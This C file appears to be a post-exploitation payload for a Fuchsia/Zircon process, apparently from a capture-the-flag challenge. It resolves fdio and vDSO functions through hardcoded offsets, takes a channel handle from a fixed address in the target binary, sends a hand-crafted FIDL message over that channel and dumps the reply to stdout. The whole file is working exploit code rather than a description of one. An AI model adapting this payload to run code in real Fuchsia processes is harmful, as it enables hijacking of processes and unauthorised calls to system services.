#define write 0x19410
#define read 0x19150
#define open 0x3e080
#define lstat 0x1b8a0
#define errno_loc 0x3de10
#define opendir 0x1c3e0
#define readdir 0x1c520
// in fdio
#define zx_vmar_root_self 0x3def0
#define zx_vmar_map 0x3df00

// in vdso
#define zx_channel_call 0x72b0
#define zx_channel_read 0x7732
#define zx_channel_write 0x776c

#define vdso_call6(name, a, b, c, d, e, f) \
  ((uint64_t (*)(void*, void*, void*, void*, void*, void*))(vdso+name))((void*)a, (void*)b, (void*)c, (void*)d, (void*)e, (void*)f)

#define vdso_call8(name, a, b, c, d, e, f, g, h) \
  ((uint64_t (*)(void*, void*, void*, void*, void*, void*, void*, void*))(vdso+name))((void*)a, (void*)b, (void*)c, (void*)d, (void*)e, (void*)f, (void*)g, (void*)h)

#define fdio_call3(name, a, b, c) \
  ((uint64_t (*)(void*, void*, void*))(fdio+name))((void*)a, (void*)b, (void*)c)

#define fdio_call2(name, a, b) \
  ((uint64_t (*)(void*, void*))(fdio+name))((void*)a, (void*)b)

#define fdio_call1(name, a) \
  ((uint64_t (*)(void*))(fdio+name))((void*)a)

#define fdio_call0(name) \
  ((uint64_t (*)(void))(fdio+name))()


void main(char *fdio, char *vdso, char *pie) {
  uint32_t handle = *(uint32_t*)((*(uint64_t*)(pie+0x12140)) + 0x10);
  uint64_t res = fdio_call3(write, 1, "hello\n", 6);  

  char *req = "\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\xcc\xbe\x07\x10\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xffYouMadeAFIDLCall";
  res = vdso_call6(zx_channel_write, handle, 0, req, 48, 0, 0);
  if (res != 0) {
    fdio_call3(write, 1, "broke\n", 6);  
    return;
  }

  uint64_t bytes;
  char bigbuf[2048];
  memset(bigbuf, 0, 2048);
  do {
    res = vdso_call8(zx_channel_read, handle, 0, bigbuf, NULL, 2048, 0, &bytes, 0);
  } while (res == 0xffffffffffffffea);

  char buf[64];
  snprintf(buf, 63, "0x%x %x %x\n", pie, handle, res);
  fdio_call3(write, 1, buf, strlen(buf));
  fdio_call3(write, 1, bigbuf, 2048);
}
